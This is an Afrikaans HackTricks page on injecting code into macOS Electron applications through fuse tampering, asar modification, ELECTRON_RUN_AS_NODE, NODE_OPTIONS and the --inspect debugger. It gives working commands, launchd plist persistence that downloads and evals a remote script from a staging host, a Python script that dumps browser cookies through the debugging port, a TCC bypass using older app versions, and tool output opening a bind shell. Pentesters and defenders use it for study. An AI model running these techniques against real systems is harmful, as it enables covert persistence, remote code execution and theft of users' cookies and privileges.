# macOS Electron-toepassingsinspuiting

{% hint style="success" %}
Leer en oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer en oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer de [**abonnementsplannen**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Basiese Inligting

As jy nie weet wat Electron is nie, kan jy [**baie inligting hier vind**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Maar vir nou moet jy net weet dat Electron **node** laat loop.\
En node het sekere **parameters** en **omgewingsveranderlikes** wat gebruik kan word om **dit ander kode te laat uitvoer** as die aangeduide lêer.

### Electron-smeulstowwe

Hierdie tegnieke sal later bespreek word, maar onlangs het Electron verskeie **sekuriteitsvlaggies bygevoeg om hulle te voorkom**. Dit is die [**Electron-smeulstowwe**](https://www.electronjs.org/docs/latest/tutorial/fuses) en dit is diegene wat gebruik word om Electron-toepassings in macOS te **verhoed om arbitrêre kode te laai**:

* **`RunAsNode`**: As dit gedeaktiveer is, voorkom dit die gebruik van die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** om kode in te spuit.
* **`EnableNodeCliInspectArguments`**: As dit gedeaktiveer is, sal parameters soos `--inspect`, `--inspect-brk` nie gerespekteer word nie. Dit verhoed sodoende die inspuiting van kode.
* **`EnableEmbeddedAsarIntegrityValidation`**: As dit geaktiveer is, sal die gelaai **`asar`-lêer** deur macOS **gevalideer** word. Dit verhoed op hierdie manier **kode-inspuiting** deur die inhoud van hierdie lêer te wysig.
* **`OnlyLoadAppFromAsar`**: As dit geaktiveer is, sal dit slegs die `app.asar` ondersoek en gebruik in plaas van om in die volgende volgorde te soek: **`app.asar`**, **`app`** en uiteindelik **`default_app.asar`**. Dit verseker dat wanneer dit **gekombineer** word met die **`embeddedAsarIntegrityValidation`**-smeulstof dit **onmoontlik** is om **nie-gevalideerde kode te laai**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: As dit geaktiveer is, gebruik die blaaierproses die lêer genaamd `browser_v8_context_snapshot.bin` vir sy V8-snapshot.

'n Ander interessante smeulstof wat nie kode-inspuiting sal voorkom nie, is:

* **EnableCookieEncryption**: As dit geaktiveer is, word die koekie-stoor op skyf met OS-vlak kriptografie sleutels geënkripteer.

### Kontroleer Electron-smeulstowwe

Jy kan **hierdie vlae kontroleer** vanuit 'n toepassing met:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Wysiging van Electron-sekeringe

Soos die [**dokumente aandui**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), word die konfigurasie van die **Electron-sekeringe** ingestel binne die **Electron-binêre lêer** wat êrens die string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** bevat.

In macOS-toepassings is dit tipies in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Jy kan hierdie lêer in [https://hexed.it/](https://hexed.it/) laai en soek na die vorige string. Na hierdie string kan jy in ASCII 'n nommer "0" of "1" sien wat aandui of elke fuus gedeaktiveer of geaktiveer is. Wysig net die hekskode (`0x30` is `0` en `0x31` is `1`) om **die fuuswaardes te wysig**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Merk op dat as jy probeer om die **`Electron Framework` binêre lêer** binne 'n toepassing met hierdie gewysigde bytes te **owerwrite**, sal die toepassing nie loop nie.

## RCE kode byvoeg tot Electron-toepassings

Daar kan **eksterne JS/HTML-lêers** wees wat 'n Electron-toepassing gebruik, sodat 'n aanvaller kode in hierdie lêers kan inspuit waarvan die handtekening nie nagegaan sal word nie en arbitrêre kode in die konteks van die toepassing kan uitvoer.

{% hint style="danger" %}
Daar is egter tans 2 beperkings:

* Die **`kTCCServiceSystemPolicyAppBundles`** toestemming is **nodig** om 'n toepassing te wysig, dus is dit standaard nie meer moontlik nie.
* Die saamgestelde **`asap`** lêer het gewoonlik die fuise **`embeddedAsarIntegrityValidation`** `en` **`onlyLoadAppFromAsar`** `geaktiveer`

Dit maak hierdie aanvalspad meer ingewikkeld (of onmoontlik).
{% endhint %}

Merk op dat dit moontlik is om die vereiste van **`kTCCServiceSystemPolicyAppBundles`** te omseil deur die toepassing na 'n ander gids te kopieer (soos **`/tmp`**), die vouer **`app.app/Contents`** te hernoem na **`app.app/NotCon`**, die **asar** lêer met jou **skadelike** kode te **wysig**, dit terug te hernoem na **`app.app/Contents`** en dit uit te voer.

Jy kan die kode uit die asar-lêer uitpak met:
```bash
npx asar extract app.asar app-decomp
```
En pak dit terug nadat dit gewysig is met:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE met `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Volgens [**die dokumente**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), as hierdie omgewingsveranderlike ingestel is, sal dit die proses begin as 'n normale Node.js-proses.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
As die **`RunAsNode`**-siklus uitgeskakel is, sal die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** geïgnoreer word, en dit sal nie werk nie.
{% endhint %}

### Inspruiting van die App Plist

Soos [**voorgestel hier**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), kan jy hierdie omgewingsveranderlike misbruik in 'n plist om volharding te handhaaf:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE met `NODE_OPTIONS`

Jy kan die lading in 'n ander lêer stoor en dit uitvoer:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
As die smeltkroes **`EnableNodeOptionsEnvironmentVariable`** is **uitgeskakel**, sal die app die omgewingsveranderlike **NODE_OPTIONS** ignoreer wanneer dit begin word tensy die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** ingestel is, wat ook **ignoreer** sal word as die smeltkroes **`RunAsNode`** uitgeskakel is.

As jy nie **`ELECTRON_RUN_AS_NODE`** instel nie, sal jy die **fout** kry: `Meeste NODE_OPTIONs word nie ondersteun in gepakde programme nie. Sien dokumentasie vir meer besonderhede.`
{% endhint %}

### Inspruiting van die App Plist

Jy kan hierdie omgewingsveranderlike misbruik in 'n plist om volharding te behou deur hierdie sleutels by te voeg:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE met inspeksie

Volgens [**hierdie**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) artikel, as jy 'n Electron-toepassing uitvoer met vlae soos **`--inspect`**, **`--inspect-brk`** en **`--remote-debugging-port`**, sal 'n **debuutpoort oop wees** sodat jy daarmee kan verbind (byvoorbeeld vanaf Chrome in `chrome://inspect`) en jy sal in staat wees om **kode daarin in te spuit** of selfs nuwe prosesse te begin.\
Byvoorbeeld:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Indien die **`EnableNodeCliInspectArguments`**-fusie gedeaktiveer is, sal die app **node parameters ignoreer** (soos `--inspect`) wanneer dit begin word tensy die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** ingestel is, wat ook **ignoreer** sal word as die **`RunAsNode`**-fusie gedeaktiveer is.

Nogtans kan jy steeds die **electron param `--remote-debugging-port=9229`** gebruik, maar die vorige lading sal nie werk om ander prosesse uit te voer nie.
{% endhint %}

Deur die param **`--remote-debugging-port=9222`** te gebruik, is dit moontlik om sekere inligting van die Electron App te steel soos die **geskiedenis** (met GET-opdragte) of die **koekies** van die webblaaier (aangesien hulle binne die webblaaier **gedekripteer** word en daar 'n **json eindpunt** is wat hulle sal gee).

Jy kan leer hoe om dit te doen [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) en [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) en die outomatiese instrument [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) gebruik of 'n eenvoudige skrips soos:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**hierdie blogpos**](https://hackerone.com/reports/1274695), word hierdie foutopsporing misbruik om 'n headless chrome **willekeurige lêers op willekeurige plekke af te laai**.

### Inspruiting vanaf die App Plist

Jy kan hierdie omgewingsveranderlike misbruik in 'n plist om volhoubaarheid by te voeg deur hierdie sleutels:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Oorspeling deur Ouer Weergawes te misbruik

{% hint style="success" %}
Die TCC daemon van macOS kontroleer nie die uitgevoerde weergawe van die aansoek nie. As jy dus nie kode kan inspuit in 'n Electron-aansoek nie met enige van die vorige tegnieke nie, kan jy 'n vorige weergawe van die toepassing aflaai en kode daarin inspuit, aangesien dit steeds die TCC-voorregte sal kry (tensy die Trust Cache dit voorkom).
{% endhint %}

## Voer nie-JS-kode uit

Die vorige tegnieke sal jou in staat stel om **JS-kode binne die proses van die Electron-aansoek** uit te voer. Onthou egter dat die **kindprosesse onder dieselfde sandbakkieprofiel** as die oueraansoek loop en **hul TCC-toestemmings erf**.\
Daarom, as jy voorregte wil misbruik om byvoorbeeld toegang tot die kamera of mikrofoon te verkry, kan jy net **'n ander binêre lêer vanuit die proses uitvoer**.

## Outomatiese Inspruiting

Die instrument [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kan maklik gebruik word om **kwesbare Electron-aansoeke** wat geïnstalleer is, te vind en kode daarin in te spuit. Hierdie instrument sal probeer om die **`--inspect`** tegniek te gebruik:

Jy moet dit self saamstel en kan dit so gebruik:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Verwysings

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
